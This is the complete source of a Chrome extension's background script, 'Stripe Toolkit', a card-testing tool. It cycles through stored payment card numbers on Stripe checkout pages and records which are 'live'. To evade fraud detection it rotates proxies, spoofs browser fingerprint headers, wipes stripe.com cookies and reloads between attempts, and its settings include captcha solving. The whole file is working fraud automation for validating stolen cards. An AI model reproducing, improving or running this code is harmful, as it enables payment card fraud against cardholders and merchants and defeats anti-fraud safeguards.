// Stripe Toolkit - Background Service Worker
// Version 3.0 - Enhanced with Proxy and Session Management

let settings = {
    autoDetect: true,
    autoFill: false,
    autoSubmit: false,
    fillDelay: 500,
    captchaApiKey: '',
    captchaService: 'internal',
    proxyEnabled: false,
    proxyList: [],
    currentProxyIndex: 0,
    proxyRotation: 'sequential', // sequential, random
    refreshOnProxy: true,
    verbose: true,
    soundAlerts: false,
    autoCaptchaClick: true,
    autoFillEmail: true,
    autoFillName: true
};

let currentSession = {
    tabId: null,
    checkoutUrl: null,
    cardsTried: 0,
    successCount: 0,
    startTime: null,
    proxy: null
};

// Generate realistic headers based on actual device fingerprint
function generateFreshHeaders() {
    // Get real device info from navigator
    const platform = navigator.platform || 'Win32';
    const vendor = navigator.vendor || 'Google Inc.';
    const language = navigator.language || 'en-US';
    
    // Realistic Chrome versions (recent)
    const chromeVersions = ['120.0.0.0', '121.0.0.0', '122.0.0.0', '123.0.0.0'];
    const chromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
    
    // Build realistic user agent based on actual platform
    let userAgent;
    if (platform.includes('Win')) {
        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`;
    } else if (platform.includes('Mac')) {
        userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`;
    } else if (platform.includes('Linux')) {
        userAgent = `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`;
    } else {
        // Default to Windows
        userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`;
    }
    
    // Generate realistic accept headers
    const acceptLanguage = `${language},${language.split('-')[0]};q=0.9,en;q=0.8`;
    const accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
    const acceptEncoding = 'gzip, deflate, br';
    
    // Screen resolution from actual device
    const screenWidth = screen.width || 1920;
    const screenHeight = screen.height || 1080;
    const colorDepth = screen.colorDepth || 24;
    
    // Timezone offset
    const timezoneOffset = new Date().getTimezoneOffset();
    
    return {
        userAgent,
        acceptLanguage,
        accept,
        acceptEncoding,
        platform,
        vendor,
        language,
        screenResolution: `${screenWidth}x${screenHeight}`,
        colorDepth,
        timezoneOffset,
        timestamp: Date.now(),
        // Additional fingerprint data
        hardwareConcurrency: navigator.hardwareConcurrency || 8,
        deviceMemory: navigator.deviceMemory || 8,
        doNotTrack: navigator.doNotTrack || 'unspecified'
    };
}

// Parse proxy string (host:port:user:pass)
function parseProxy(proxyString) {
    if (!proxyString) return null;
    const parts = proxyString.split(':');
    if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parts[1],
            username: parts[2] || null,
            password: parts[3] || null,
            scheme: 'http'
        };
    }
    return null;
}

// Get next proxy from list
function getNextProxy() {
    if (!settings.proxyEnabled || !settings.proxyList || settings.proxyList.length === 0) {
        return null;
    }
    
    let index;
    if (settings.proxyRotation === 'random') {
        index = Math.floor(Math.random() * settings.proxyList.length);
    } else {
        index = settings.currentProxyIndex;
        settings.currentProxyIndex = (settings.currentProxyIndex + 1) % settings.proxyList.length;
    }
    
    return parseProxy(settings.proxyList[index]);
}

// Set up proxy for requests
async function setupProxy(proxy) {
    if (!proxy) {
        // Clear proxy
        await chrome.proxy.settings.clear({ scope: 'regular' });
        console.log('[PROXY] Proxy cleared');
        return;
    }
    
    const config = {
        mode: 'fixed_servers',
        rules: {
            singleProxy: {
                scheme: proxy.scheme || 'http',
                host: proxy.host,
                port: parseInt(proxy.port)
            },
            bypassList: ['localhost', '127.0.0.1']
        }
    };
    
    try {
        await chrome.proxy.settings.set({ value: config, scope: 'regular' });
        console.log('[PROXY] Proxy set:', proxy.host + ':' + proxy.port);
        
        // Handle proxy authentication if needed
        if (proxy.username && proxy.password) {
            chrome.webRequest.onAuthRequired.addListener(
                (details, callback) => {
                    callback({
                        authCredentials: {
                            username: proxy.username,
                            password: proxy.password
                        }
                    });
                },
                { urls: ['<all_urls>'] },
                ['asyncBlocking']
            );
        }
        
        return true;
    } catch (e) {
        console.error('[PROXY] Failed to set proxy:', e);
        return false;
    }
}

// Refresh session with new headers and optionally new proxy
async function refreshSession(tabId, useNewProxy = true) {
    console.log('[SESSION] Refreshing session for tab:', tabId);
    
    const freshHeaders = generateFreshHeaders();
    
    // Get new proxy if enabled
    let proxy = null;
    if (useNewProxy && settings.proxyEnabled) {
        proxy = getNextProxy();
        await setupProxy(proxy);
    }
    
    // Clear cookies for stripe.com
    try {
        const cookies = await chrome.cookies.getAll({ domain: 'stripe.com' });
        for (const cookie of cookies) {
            await chrome.cookies.remove({
                url: `https://${cookie.domain}${cookie.path}`,
                name: cookie.name
            });
        }
        console.log('[SESSION] Cleared', cookies.length, 'cookies');
    } catch (e) {
        console.log('[SESSION] Cookie clear error:', e);
    }
    
    // Update session info
    currentSession.proxy = proxy;
    currentSession.headers = freshHeaders;
    
    // Notify content script
    try {
        await chrome.tabs.sendMessage(tabId, {
            action: 'sessionRefreshed',
            headers: freshHeaders,
            proxy: proxy ? `${proxy.host}:${proxy.port}` : null
        });
    } catch (e) {}
    
    return { headers: freshHeaders, proxy };
}

// Modify request headers for fingerprint spoofing
chrome.webRequest.onBeforeSendHeaders.addListener(
    (details) => {
        if (!currentSession.headers) return { requestHeaders: details.requestHeaders };
        
        const headers = details.requestHeaders;
        
        for (let i = 0; i < headers.length; i++) {
            if (headers[i].name.toLowerCase() === 'user-agent') {
                headers[i].value = currentSession.headers.userAgent;
            }
            if (headers[i].name.toLowerCase() === 'accept-language') {
                headers[i].value = currentSession.headers.acceptLanguage;
            }
        }
        
        return { requestHeaders: headers };
    },
    { urls: ['*://*.stripe.com/*'] },
    ['blocking', 'requestHeaders']
);

chrome.runtime.onInstalled.addListener((details) => {
    console.log('[BACKGROUND] Stripe Toolkit installed', details.reason);
    
    // Open settings page on install
    if (details.reason === 'install') {
        chrome.tabs.create({ url: chrome.runtime.getURL('pages/settings.html') });
    }
    
    chrome.storage.local.get(['settings', 'cards', 'liveCards', 'deadCards'], (data) => {
        if (data.settings) settings = { ...settings, ...data.settings };
    });
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    const tabId = sender.tab?.id;
    
    switch (message.type) {
        case 'checkoutDetected':
            handleCheckoutDetected(tabId, message);
            break;
            
        case 'cardResult':
            handleCardResult(tabId, message.result);
            break;
            
        case 'pageError':
            console.log('[BACKGROUND] Page error:', message.message);
            break;
            
        case 'pageDecline':
            console.log('[BACKGROUND] Page decline detected:', message.message);
            handleCardResult(tabId, { status: 'dead', error: message.message });
            break;
            
        case 'getSettings':
            sendResponse(settings);
            break;
            
        case 'settingsUpdated':
            settings = { ...settings, ...message.settings };
            chrome.storage.local.set({ settings });
            break;
            
        case 'openSettings':
            chrome.tabs.create({ url: chrome.runtime.getURL('pages/settings.html') });
            break;
            
        case 'getCards':
            chrome.storage.local.get(['cards'], (data) => {
                sendResponse(data.cards || []);
            });
            return true;
            
        case 'saveCards':
            chrome.storage.local.set({ cards: message.cards });
            sendResponse({ success: true });
            break;
            
        case 'getLiveCards':
            chrome.storage.local.get(['liveCards'], (data) => {
                sendResponse(data.liveCards || []);
            });
            return true;
            
        case 'getDeadCards':
            chrome.storage.local.get(['deadCards'], (data) => {
                sendResponse(data.deadCards || []);
            });
            return true;
            
        case 'refreshSession':
            refreshSession(tabId, message.useNewProxy !== false).then(result => {
                sendResponse(result);
            });
            return true;
            
        case 'setProxy':
            const proxy = parseProxy(message.proxy);
            setupProxy(proxy).then(success => {
                sendResponse({ success });
            });
            return true;
            
        case 'clearProxy':
            setupProxy(null).then(() => {
                sendResponse({ success: true });
            });
            return true;
            
        case 'getProxyList':
            sendResponse(settings.proxyList || []);
            break;
            
        case 'saveProxyList':
            settings.proxyList = message.proxies;
            chrome.storage.local.set({ settings });
            sendResponse({ success: true });
            break;
            
        case 'startProcessing':
            console.log('[BACKGROUND] Start processing requested');
            currentSession.isProcessing = true;
            processNextCard(tabId);
            sendResponse({ success: true });
            break;
            
        case 'stopProcessing':
            console.log('[BACKGROUND] Stop processing requested');
            currentSession.isProcessing = false;
            sendResponse({ success: true });
            break;
            
        case 'nextCard':
            processNextCard(tabId);
            break;
            
        case 'getSessionInfo':
            sendResponse({
                ...currentSession,
                proxy: currentSession.proxy ? `${currentSession.proxy.host}:${currentSession.proxy.port}` : null
            });
            break;
            
        default:
            console.log('[BACKGROUND] Unknown message:', message.type);
    }
    
    return true;
});

function handleCheckoutDetected(tabId, message) {
    console.log('[BACKGROUND] Checkout detected:', tabId, message.info?.url);
    
    // Initialize session
    currentSession.tabId = tabId;
    currentSession.checkoutUrl = message.info?.url;
    currentSession.startTime = Date.now();
    currentSession.cardsTried = 0;
    currentSession.successCount = 0;
    
    chrome.action.setBadgeText({ text: 'ON', tabId: tabId });
    chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
    
    // Refresh session with fresh headers
    if (settings.refreshOnProxy) {
        refreshSession(tabId, settings.proxyEnabled);
    }
    
    if (settings.autoFill) {
        chrome.storage.local.get(['cards', 'currentCardIndex'], (data) => {
            const cards = data.cards || [];
            const index = data.currentCardIndex || 0;
            
            if (cards.length > 0 && cards[index]) {
                setTimeout(() => {
                    chrome.tabs.sendMessage(tabId, {
                        action: 'fillCard',
                        card: cards[index]
                    });
                }, settings.fillDelay);
            }
        });
    }
}

function handleCardResult(tabId, result) {
    console.log('[BACKGROUND] Card result:', result);
    
    chrome.storage.local.get(['cards', 'currentCardIndex', 'liveCards', 'deadCards'], (data) => {
        const cards = data.cards || [];
        const index = data.currentCardIndex || 0;
        let liveCards = data.liveCards || [];
        let deadCards = data.deadCards || [];
        
        if (cards[index]) {
            const card = cards[index];
            card.timestamp = Date.now();
            
            if (result.success || result.status === 'live') {
                card.status = 'live';
                liveCards.push({ ...card });
                currentSession.successCount++;
                
                chrome.action.setBadgeText({ text: 'LIVE', tabId: tabId });
                chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
                
                if (settings.soundAlerts) {
                    chrome.tabs.sendMessage(tabId, { action: 'playSound', type: 'live' });
                }
                
                chrome.notifications.create({
                    type: 'basic',
                    iconUrl: 'icons/icon128.png',
                    title: '🎉 LIVE CARD FOUND!',
                    message: `Card ending in ${card.number.slice(-4)} is LIVE!`,
                    priority: 2
                });
            } else {
                card.status = 'dead';
                card.error = result.error || result.declineCode || 'Declined';
                deadCards.push({ ...card });
                currentSession.cardsTried++;
                
                chrome.action.setBadgeText({ text: 'DEAD', tabId: tabId });
                chrome.action.setBadgeBackgroundColor({ color: '#ef4444', tabId: tabId });
            }
            
            cards[index] = card;
            
            chrome.storage.local.set({
                cards: cards,
                liveCards: liveCards,
                deadCards: deadCards
            });
            
            // Auto-process next card if enabled
            if (settings.autoFill && result.status === 'dead') {
                setTimeout(() => processNextCard(tabId), 1000);
            }
        }
    });
}

async function processNextCard(tabId) {
    // Check if processing is stopped
    if (!currentSession.isProcessing) {
        console.log('[BACKGROUND] Processing stopped by user');
        return;
    }
    
    // Refresh session before next card
    if (settings.refreshOnProxy) {
        await refreshSession(tabId, settings.proxyEnabled);
    }
    
    chrome.storage.local.get(['cards', 'currentCardIndex'], (data) => {
        const cards = data.cards || [];
        let index = (data.currentCardIndex || 0) + 1;
        
        if (index >= cards.length) {
            console.log('[BACKGROUND] All cards processed');
            currentSession.isProcessing = false;
            chrome.tabs.sendMessage(tabId, { action: 'allCardsProcessed' });
            return;
        }
        
        chrome.storage.local.set({ currentCardIndex: index });
        
        // Reload page for fresh session
        if (settings.refreshOnProxy) {
            chrome.tabs.reload(tabId, {}, () => {
                setTimeout(() => {
                    chrome.tabs.sendMessage(tabId, {
                        action: 'fillCard',
                        card: cards[index]
                    });
                }, 2000);
            });
        } else {
            setTimeout(() => {
                chrome.tabs.sendMessage(tabId, {
                    action: 'fillCard',
                    card: cards[index]
                });
            }, settings.fillDelay);
        }
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && settings.autoDetect) {
        const url = tab.url || '';
        if (url.includes('checkout.stripe.com') || 
            url.includes('stripe.com/pay') ||
            url.includes('/checkout')) {
            
            chrome.action.setBadgeText({ text: 'ON', tabId: tabId });
            chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
        }
    }
});

chrome.tabs.onRemoved.addListener((tabId) => {
    if (currentSession.tabId === tabId) {
        currentSession.tabId = null;
    }
    console.log('[BACKGROUND] Tab closed:', tabId);
});

console.log('[BACKGROUND] Service worker started - v3.0');
